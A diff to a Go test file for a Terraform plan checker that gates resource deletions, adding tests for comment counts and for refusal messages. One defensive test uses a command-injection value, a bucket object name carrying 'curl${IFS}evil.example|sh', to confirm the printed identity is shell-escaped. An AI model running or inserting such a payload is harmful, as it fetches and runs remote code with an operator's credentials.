@@ -2,6 +2,7 @@ package tf
 
 import (
 	"encoding/json"
+	"os"
 	"slices"
 	"strings"
 	"testing"
@@ -157,6 +158,53 @@ func TestManagedAllowedTypesIsDecided(t *testing.T) {
 	if got := ManagedAllowedTypes(); !slices.IsSorted(got) || len(got) != len(managedTypes) {
 		t.Errorf("ManagedAllowedTypes is %v: not the list's own keys", got)
 	}
+}
+
+// TestManagedCoverCommentsCountTheDroppedTypes: both comments in
+// managed_cover.go that say how many entries managedDropped has read "twelve"
+// while the map grew to seventeen, and nothing noticed — a count in prose is a
+// second copy of a fact the map already holds, and the map is the copy that
+// cannot be wrong. This reads the two sentences and the map against each
+// other.
+//
+// Mutation (put "twelve" back in either sentence, or add an entry to
+// managedDropped without touching them): this fails.
+func TestManagedCoverCommentsCountTheDroppedTypes(t *testing.T) {
+	src, err := os.ReadFile("managed_cover.go")
+	if err != nil {
+		t.Fatal(err)
+	}
+	word, ok := droppedCountWord(len(managedDropped))
+	if !ok {
+		t.Skipf("managedDropped has %d entries, more than this check spells in words; enlarge droppedCountWord", len(managedDropped))
+	}
+	// Flattened with the comment markers dropped, because the file wraps both
+	// sentences: the number and the words after it are on different lines.
+	flat := strings.Join(strings.Fields(strings.ReplaceAll(string(src), "//", " ")), " ")
+	for _, tail := range []string{"entries in managedDropped", "entries of managedDropped"} {
+		at := strings.Index(flat, tail)
+		if at < 0 {
+			t.Errorf("managed_cover.go no longer says %q: this test's marker has moved", tail)
+			continue
+		}
+		before := strings.Fields(flat[:at])
+		if got := before[len(before)-1]; got != word {
+			t.Errorf("managed_cover.go says %q before %q, and managedDropped has %d entries (%s): the count in the comment is a second copy of what the map holds", got, tail, len(managedDropped), word)
+		}
+	}
+}
+
+// droppedCountWord spells a small count the way managed_cover.go's comments do,
+// so the comparison is against the sentence rather than against a digit the
+// file never prints.
+func droppedCountWord(n int) (string, bool) {
+	words := []string{"zero", "one", "two", "three", "four", "five", "six", "seven",
+		"eight", "nine", "ten", "eleven", "twelve", "thirteen", "fourteen", "fifteen",
+		"sixteen", "seventeen", "eighteen", "nineteen", "twenty"}
+	if n < 0 || n >= len(words) {
+		return "", false
+	}
+	return words[n], true
 }
 
 // managedKeptFixture is one resource per type the list keeps: the type's own
@@ -1586,15 +1634,6 @@ func TestManagedCoverDropsInitAttributeChecks(t *testing.T) {
 // create is. The address alone never admits one, and the list alone neither:
 // the two are separate rules and a fixture fails each on its own.
 
-// destroyed is the change terraform writes for a resource it destroys: the
-// resource in before, null in after, and no after_unknown. It is what the
-// removed half of a delete or a replace is read from.
-//
-// The view carries an id, because terraform's state does: every resource of
-// Google's provider has one, and it is what the owner's delete list binds an
-// approval to (Task 6.3). The fixtures above are written without one — no
-// other rule reads it — so it is added here, on a copy, and never on the
-// fixture's own map, which every test in this file shares.
 // withInstance is rc with the per-instance attribute its type carries filled
 // into its before view when the fixture did not write one
 // (removalInstanceAttributes, read here as the rule reads it). A state
@@ -1630,6 +1669,15 @@ func withInstance(rc ResourceChange) ResourceChange {
 	return rc
 }
 
+// destroyed is the change terraform writes for a resource it destroys: the
+// resource in before, null in after, and no after_unknown. It is what the
+// removed half of a delete or a replace is read from.
+//
+// The view carries an id, because terraform's state does: every resource of
+// Google's provider has one, and it is what the owner's delete list binds an
+// approval to (Task 6.3). The fixtures above are written without one — no
+// other rule reads it — so it is added here, on a copy, and never on the
+// fixture's own map, which every test in this file shares.
 func destroyed(rc ResourceChange) ResourceChange {
 	before := make(map[string]any, len(rc.Change.After)+1)
 	for k, v := range rc.Change.After {
@@ -1819,6 +1867,44 @@ func TestManagedCoverRefusesAListedDeleteOfALockedResource(t *testing.T) {
 	}
 }
 
+// TestManagedCoverRefusalOfAShellCommandNameIsPasteable: the refusal an
+// unlisted removal draws prints the identity of the object the plan removes,
+// for its reader to copy into fugaro allow-delete — and the object's own name
+// is the plan's, not this program's. The name rule (managedName) does not
+// reach this one: for a bucket object the attribute managedNames names is the
+// BUCKET, so the object's own name is read out of the before view as it
+// stands. A plan carrying "fmgd-x;curl${IFS}evil.example|sh" there is a plan
+// whose refusal would otherwise hand its reader a command line to paste, with
+// the operator's credentials, so this pins the end the identity's escaping is
+// for: the sentence holds no byte a shell reads (tf.identityValue,
+// TestAnIdentityHoldsNoByteAShellWouldRead for the encoder itself).
+func TestManagedCoverRefusalOfAShellCommandNameIsPasteable(t *testing.T) {
+	rc := destroyed(managedKeptFixture["google_storage_bucket_object"])
+	rc.Change.Before = map[string]any{
+		"bucket": ManagedPrefix + "bucket", "name": `fmgd-x;curl${IFS}evil.example|sh`,
+		"id": ManagedPrefix + "bucket/x", "project": "proj-1", "generation": float64(1758000000000000)}
+	out := managedTestCover().NotCovered(managedPlan(rc), nil)
+	if len(out) != 1 {
+		t.Fatalf("an unlisted delete of a bucket object gives %q, want one refusal", out)
+	}
+	// The identity the sentence prints, copied the way its reader copies it:
+	// what follows the sentence's own words, up to the bracket that closes its
+	// parenthetical. The sentence's own text is not part of it — it is this
+	// program's, and it holds an apostrophe of its own.
+	const mark = "(the plan removes "
+	i := strings.Index(out[0], mark)
+	if i < 0 {
+		t.Fatalf("the refusal does not name the object the plan removes:\n%s", out[0])
+	}
+	printed := strings.TrimSuffix(out[0][i+len(mark):], ")")
+	if strings.ContainsAny(printed, ";|&$`{}[]*?!~'\"") {
+		t.Errorf("the refusal prints the plan's own name raw, so a reader pasting it runs a command:\n%s", printed)
+	}
+	if !strings.Contains(printed, `fmgd-x\x3bcurl\x24\x7bIFS\x7devil.example\x7csh`) {
+		t.Errorf("the refusal does not carry the name as the identity escapes it:\n%s", printed)
+	}
+}
+
 // TestManagedCoverReplacesAreJudgedLikeDeletes: both of terraform's action
 // orders, and both halves — the resource the plan removes and the one it
 // creates. A replace of a listed address is refused when either half is not
@@ -1852,10 +1938,20 @@ func TestManagedCoverReplacesAreJudgedLikeDeletes(t *testing.T) {
 			}
 			// The unlisted replace, whose resources are both the plan's own:
 			// the list is the whole of the refusal, and the resource rules
-			// have nothing to say about it.
-			if out := managedTestCover().NotCovered(managedPlan(replacing(prefixed, prefixed)), nil); len(out) != 1 ||
-				!strings.Contains(out[0], "not on the owner's delete list") {
+			// have nothing to say about it. The refusal prints the identity of
+			// the object the plan removes beside the address, because that is
+			// what an entry of the owner's list has to name and the address
+			// alone stopped being an entry (Task 6.3): an owner sent to record
+			// the address would write a list that approves nothing. The
+			// identity is read back from RemoveIdentityText, the rule's own
+			// answer, rather than spelled out here.
+			unlisted := managedPlan(replacing(prefixed, prefixed))
+			out := managedTestCover().NotCovered(unlisted, nil)
+			if len(out) != 1 || !strings.Contains(out[0], "not on the owner's delete list") {
 				t.Fatalf("an unlisted replace of two allowed resources gives %q, want the delete-list rule", out)
+			}
+			if id := RemoveIdentityText(unlisted.ResourceChanges[0]); !strings.Contains(out[0], id) {
+				t.Errorf("the refusal is %q, want the identity the owner's entry must carry named in it (%s)", out[0], id)
 			}
 		})
 	}
